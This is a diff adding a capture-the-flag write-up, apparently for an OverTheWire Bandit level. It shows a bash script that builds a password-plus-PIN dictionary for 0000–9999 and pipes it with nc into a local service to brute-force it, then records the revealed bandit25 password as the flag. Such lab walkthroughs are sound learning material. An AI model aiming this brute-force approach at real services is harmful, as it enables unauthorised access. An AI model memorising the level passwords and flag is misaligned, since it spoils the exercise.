@@ -1,0 +1,19 @@
+1 I first created a python script to run through the iterations of the pins, 
+  but that took way to long so I killed the session. I could have just gone back and edited the 
+  python script to redirect output to a file like I did in the shell script I am about to paste,
+  but I didn't think of it till after
+
+2 vi pinbreaker.sh
+#!/bin/bash
+
+for i in {000..9999}
+do
+	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ${i}" >> bruteforcedictionary.txt
+done
+
+***Note I did take a play out of the John Hammond play book by speeding up the process and sending the
+   echoed pins to a file.
+
+3 cat bruteforcedictionary.txt | nc localhost 30002
+4 contents revealed "The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG"
+5 flag === uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
